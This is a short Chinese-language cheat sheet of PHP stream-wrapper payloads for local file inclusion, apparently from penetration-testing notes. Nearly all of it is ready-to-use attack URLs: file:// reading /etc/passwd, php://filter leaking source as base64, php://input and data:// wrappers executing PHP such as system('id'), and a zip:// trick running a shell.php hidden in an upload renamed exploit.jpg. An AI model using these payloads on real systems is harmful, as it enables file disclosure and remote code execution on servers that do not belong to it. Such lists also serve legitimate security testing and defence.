## 伪协议利用
```text
# file://
http://www.xx.com?file=file:///etc/passswd

# php://filter，以 base64 展示
http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]

# php://input，POST 方式执行 webshell
http://127.0.0.1/cmd.php?cmd=php://input
<?php phpinfo()?>

# data://，PHP>=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。
http://127.0.0.1/cmd.php?file=data://text/plain,<?php system('id'); ?>
http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+

# zip://，创建包含shell.php的exploit.zip，上传并重命名为exploit.jpg
http://127.0.0.1/cmd.php?file=zip://exploit.jpg%23shell.php
```
